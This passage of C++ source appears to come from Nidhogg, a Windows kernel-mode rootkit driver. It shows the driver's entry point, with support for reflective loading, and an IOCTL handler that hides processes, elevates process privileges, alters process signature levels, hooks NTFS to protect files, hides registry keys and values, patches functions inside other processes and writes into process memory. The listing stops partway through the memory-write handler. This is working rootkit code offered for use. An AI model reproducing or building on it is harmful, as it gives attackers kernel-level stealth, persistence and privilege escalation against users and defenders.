#include "pch.h"
#include "NidhoggUtils.h"

extern "C"
NTSTATUS CustomDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
#ifdef DRIVER_REFLECTIVELY_LOADED
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	Features.DriverReflectivelyLoaded = true;
	Features.ProcessProtection = false;
	Features.RegistryFeatures = false;
	KdPrint((DRIVER_PREFIX "Driver is being reflectively loaded...\n"));

	UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"\\Driver\\Nidhogg");
	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
	tIoCreateDriver IoCreateDriver = (tIoCreateDriver)MmGetSystemRoutineAddress(&routineName);

	if (!IoCreateDriver)
		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;

	return IoCreateDriver(&driverName, &NidhoggEntry);
#endif

	return NidhoggEntry(DriverObject, RegistryPath);
}

NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status = STATUS_SUCCESS;
	pGlobals.Init();
	fGlobals.Init();
	rGlobals.Init();
	dimGlobals.Init();

	if (!dimGlobals.MmCopyVirtualMemory)
		Features.ReadData = false;

	if (!dimGlobals.ZwProtectVirtualMemory || !Features.ReadData)
		Features.WriteData = false;

	if (!Features.WriteData || !dimGlobals.PsGetProcessPeb)
		Features.FunctionPatching = false;

	if (!dimGlobals.ObReferenceObjectByName)
		Features.FileProtection = false;

	// Setting up the device object.
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	UNICODE_STRING altitude = RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE);
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(REG_CALLBACK_ALTITUDE);
	PDEVICE_OBJECT DeviceObject = nullptr;

	// Creating device and symbolic link.
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status));
		return status;
	}

	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// Registering the process callback function only if the driver isn't reflectively loaded (to avoid BSOD).
	if (!Features.DriverReflectivelyLoaded) {
		OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,		// object type
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr	// pre, post
		}
		};
		OB_CALLBACK_REGISTRATION registrationCallbacks = {
			OB_FLT_REGISTRATION_VERSION,
			1,				// operation count
			RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),		// altitude
			nullptr,		// context
			operations
		};

		status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status));
			status = STATUS_SUCCESS;
			Features.ProcessProtection = false;
		}

		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status));
			status = STATUS_SUCCESS;
			Features.RegistryFeatures = false;
		}
	}

	// Setting up functions.
	DriverObject->DriverUnload = NidhoggUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;

	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
	return status;
}

/*
* Description:
* NidhoggUnload is responsible for handling the driver unloading process which includes: Removing all hooks, deleting the symbolic link and the deviceobject.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT] -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
*
* Returns:
* There is no return value.
*/
void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
	KdPrint((DRIVER_PREFIX "Unloading...\n"));

	NTSTATUS status = CmUnRegisterCallback(rGlobals.RegCookie);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to unregister registry callbacks: (0x%08X)\n", status));
	}

	ClearAll();

	// To avoid BSOD.
	if (RegistrationHandle) {
		ObUnRegisterCallbacks(RegistrationHandle);
		RegistrationHandle = NULL;
	}

	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	IoDeleteSymbolicLink(&symbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

/*
* Description:
* CompleteIrp is responsible for handling the status return via the IRP.
*
* Parameters:
* @Irp	   [PIRP]	   -- The IRP that contains the request's status.
* @status  [NTSTATUS]  -- The status to assign to the IRP.
* @info    [ULONG_PTR] -- Additional information to assign to the IRP.
*
* Returns:
* @status [NTSTATUS]   -- The given status parameter.
*/
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);
	return status;
}

/*
* Description:
* NidhoggCreateClose is responsible for creating a success response for given IRP.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Not used.
* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
*/
NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

/*
* Description: 
* NidhoggDeviceControl is responsible for handling IOCTLs and returning output to the user via IRPs. 
* Every user communication should go through this function using the relevant IOCTL.
* 
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Not used.
* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
* 
* Returns:
* @status		[NTSTATUS]		 -- Whether the function succeeded or not, if not the error code.
*/
NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	auto len = 0;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_NIDHOGG_PROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		AutoLock locker(pGlobals.Lock);

		if (pGlobals.ProtectedProcesses.PidsCount == MAX_PIDS) {
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (FindProcess(*data))
			break;

		if (!AddProcess(*data)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", *data));
		len += sizeof(ULONG);

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		AutoLock locker(pGlobals.Lock);

		if (pGlobals.ProtectedProcesses.PidsCount == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (!RemoveProcess(*data)) {
			status = STATUS_NOT_FOUND;
			break;
		}

		
		KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", *data));
		len += sizeof(ULONG);

		break;
	}

	case IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION:
	{
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		AutoLock locker(pGlobals.Lock);
		memset(&pGlobals.ProtectedProcesses.Processes, 0, sizeof(pGlobals.ProtectedProcesses.Processes));
		pGlobals.ProtectedProcesses.PidsCount = 0;
		break;
	}

	case IOCTL_NIDHOGG_HIDE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(HideProcess(*data))) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", *data));
		break;
	}

	case IOCTL_NIDHOGG_ELEVATE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = ElevateProcess(*data);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));

		break;
	}

	case IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ProcessSignature) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProcessSignature*)Irp->AssociatedIrp.SystemBuffer;

		if ((data->Pid == 4) || 
			(data->SignatureSigner < PsProtectedSignerNone || data->SignatureSigner > PsProtectedSignerMax) ||
			(data->SignerType < PsProtectedTypeNone || data->SignerType > PsProtectedTypeProtected)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = SetProcessSignature(data);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "New signature applied to %d.\n", data->Pid));

		break;
	}

	case IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES:
	{
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ProcessesList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProcessesList*)Irp->AssociatedIrp.SystemBuffer;

		AutoLock locker(pGlobals.Lock);
		data->PidsCount = pGlobals.ProtectedProcesses.PidsCount;

		for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++) {
			data->Processes[i] = pGlobals.ProtectedProcesses.Processes[i];
		}

		len += sizeof(ProcessesList);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_FILE:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		if (fGlobals.Files.FilesCount == MAX_FILES) {
			KdPrint((DRIVER_PREFIX "List is full.\n"));
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!FindFile(data)) {
			if (!AddFile(data)) {
				KdPrint((DRIVER_PREFIX "Failed to add file.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			if (!fGlobals.Callbacks[0].Activated) {
				status = InstallNtfsHook(IRP_MJ_CREATE);

				if (!NT_SUCCESS(status)) {
					RemoveFile(data);
					KdPrint((DRIVER_PREFIX "Failed to hook ntfs.\n"));
					break;
				}
			}
			
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Protecting file %ws.\n", data));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_FILE:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		if (!RemoveFile(data)) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (fGlobals.Files.FilesCount == 0) {
			status = UninstallNtfsHook(IRP_MJ_CREATE);

			if (!NT_SUCCESS(status)) {
				KdPrint((DRIVER_PREFIX "Failed to restore the hook.\n"));
			}
		}

		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Unprotected file %ws.\n", data));
		KeRaiseIrql(prevIrql, &prevIrql);
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
			ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
			fGlobals.Files.FilesPath[i] = nullptr;
		}

		fGlobals.Files.FilesCount = 0;
		break;
	}

	case IOCTL_NIDHOGG_QUERY_FILES:
	{
		errno_t err;

		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(FileItem) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (FileItem*)Irp->AssociatedIrp.SystemBuffer;
		AutoLock locker(fGlobals.Lock);

		if (data->FileIndex == 0) {
			data->FileIndex = fGlobals.Files.FilesCount;

			if (fGlobals.Files.FilesCount > 0) {
				err = wcscpy_s(data->FilePath, fGlobals.Files.FilesPath[0]);

				if (err != 0) {
					status = STATUS_INVALID_USER_BUFFER;
					KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
				}
			}
		}
		else if (data->FileIndex > fGlobals.Files.FilesCount || data->FileIndex < 0) {
			status = STATUS_INVALID_PARAMETER;
		}
		else {
			err = wcscpy_s(data->FilePath, fGlobals.Files.FilesPath[data->FileIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}
		}

		len += sizeof(FileItem);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_REGITEM:
	{
		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;	

		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY && 
			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE) || 
			wcslen((*data).KeyPath) == 0) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(rGlobals.Lock);

		if (data->Type == REG_TYPE_PROTECTED_KEY) {
			if (rGlobals.ProtectedItems.Keys.KeysCount == MAX_REG_ITEMS) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}
		}
		else if (data->Type == REG_TYPE_HIDDEN_KEY) {
			if (rGlobals.HiddenItems.Keys.KeysCount == MAX_REG_ITEMS) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}
		}
		else if (data->Type == REG_TYPE_PROTECTED_VALUE) {
			if (rGlobals.ProtectedItems.Values.ValuesCount == MAX_REG_ITEMS) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}
		}
		else if (data->Type == REG_TYPE_HIDDEN_VALUE) {
			if (rGlobals.HiddenItems.Values.ValuesCount == MAX_REG_ITEMS) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}
		}
		else {
			KdPrint((DRIVER_PREFIX "Unknown registry object type.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!FindRegItem(*data)) {
			if (!AddRegItem(*data)) {
				KdPrint((DRIVER_PREFIX "Failed to add new registry item.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Added new registry item of type %d.\n", data->Type));
		}
		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_REGITEM:
	{
		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
		
		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY &&
			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE) ||
			wcslen((*data).KeyPath) == 0) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(rGlobals.Lock);

		if (!RemoveRegItem(*data)) {
			KdPrint((DRIVER_PREFIX "Registry item not found.\n"));
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_REGITEMS:
	{
		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		AutoLock registryLocker(rGlobals.Lock);

		for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
			ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
			rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
		}
		rGlobals.ProtectedItems.Keys.KeysCount = 0;

		for (int i = 0; i < rGlobals.HiddenItems.Keys.KeysCount; i++) {
			ExFreePoolWithTag(rGlobals.HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
			rGlobals.HiddenItems.Keys.KeysPath[i] = nullptr;
		}
		rGlobals.HiddenItems.Keys.KeysCount = 0;

		for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
			ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
			ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
			rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
			rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
		}
		rGlobals.ProtectedItems.Values.ValuesCount = 0;

		for (int i = 0; i < rGlobals.HiddenItems.Values.ValuesCount; i++) {
			ExFreePoolWithTag(rGlobals.HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
			ExFreePoolWithTag(rGlobals.HiddenItems.Values.ValuesName[i], DRIVER_TAG);
			rGlobals.HiddenItems.Values.ValuesPath[i] = nullptr;
			rGlobals.HiddenItems.Values.ValuesName[i] = nullptr;
		}
		rGlobals.HiddenItems.Values.ValuesCount = 0;

		break;
	}

	case IOCTL_NIDHOGG_QUERY_REGITEMS: 
	{
		errno_t err;

		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
		AutoLock locker(rGlobals.Lock);

		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY &&
			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE)) {
			KdPrint((DRIVER_PREFIX "Invalid buffer.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->RegItemsIndex == 0) {
			if (data->Type == REG_TYPE_PROTECTED_KEY) {
				data->RegItemsIndex = rGlobals.ProtectedItems.Keys.KeysCount;

				if (rGlobals.ProtectedItems.Keys.KeysCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Keys.KeysPath[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_HIDDEN_KEY) {
				data->RegItemsIndex = rGlobals.HiddenItems.Keys.KeysCount;

				if (rGlobals.HiddenItems.Keys.KeysCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Keys.KeysPath[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_PROTECTED_VALUE) {
				data->RegItemsIndex = rGlobals.ProtectedItems.Values.ValuesCount;

				if (rGlobals.ProtectedItems.Values.ValuesCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Values.ValuesPath[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}

					err = wcscpy_s(data->ValueName, rGlobals.ProtectedItems.Values.ValuesName[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_HIDDEN_VALUE) {
				data->RegItemsIndex = rGlobals.HiddenItems.Values.ValuesCount;

				if (rGlobals.HiddenItems.Values.ValuesCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Values.ValuesPath[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}

					err = wcscpy_s(data->ValueName, rGlobals.HiddenItems.Values.ValuesName[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
		}
		else if ((data->Type == REG_TYPE_PROTECTED_KEY && data->RegItemsIndex > rGlobals.ProtectedItems.Keys.KeysCount) ||
				  (data->Type == REG_TYPE_PROTECTED_VALUE && data->RegItemsIndex > rGlobals.ProtectedItems.Values.ValuesCount) ||
			  	  (data->Type == REG_TYPE_HIDDEN_KEY && data->RegItemsIndex > rGlobals.HiddenItems.Keys.KeysCount) ||
				  (data->Type == REG_TYPE_HIDDEN_VALUE && data->RegItemsIndex > rGlobals.HiddenItems.Values.ValuesCount) ||
				  data->RegItemsIndex < 0) {
			status = STATUS_INVALID_PARAMETER;
		}
		else {
			if (data->Type == REG_TYPE_PROTECTED_KEY) {
				if (rGlobals.ProtectedItems.Keys.KeysCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Keys.KeysPath[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_HIDDEN_KEY) {
				if (rGlobals.HiddenItems.Keys.KeysCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Keys.KeysPath[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_PROTECTED_VALUE) {
				if (rGlobals.ProtectedItems.Values.ValuesCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Values.ValuesPath[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}

					err = wcscpy_s(data->ValueName, rGlobals.ProtectedItems.Values.ValuesName[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_HIDDEN_VALUE) {
				if (rGlobals.HiddenItems.Values.ValuesCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Values.ValuesPath[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}

					err = wcscpy_s(data->ValueName, rGlobals.HiddenItems.Values.ValuesName[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
		}

		len += sizeof(RegItem);

		break;
	}

	case IOCTL_NIDHOGG_PATCH_MODULE:
	{
		if (!Features.FunctionPatching) {
			KdPrint((DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(PatchedModule) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (PatchedModule*)Irp->AssociatedIrp.SystemBuffer;

		if (!data->FunctionName || !data->ModuleName || !data->Patch || 
			data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || data->PatchLength <= 0) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = PatchModule(data);
		
		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", (*data).ModuleName, (*data).FunctionName, data->Pid));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(PatchedModule);
		break;
	}

	case IOCTL_NIDHOGG_WRITE_DATA:
	{
		PEPROCESS TargetProcess;

		if (!Features.WriteData) {
			KdPrint((DRIVER_PREFIX "Due to previous error, write data feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(PkgReadWriteData) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

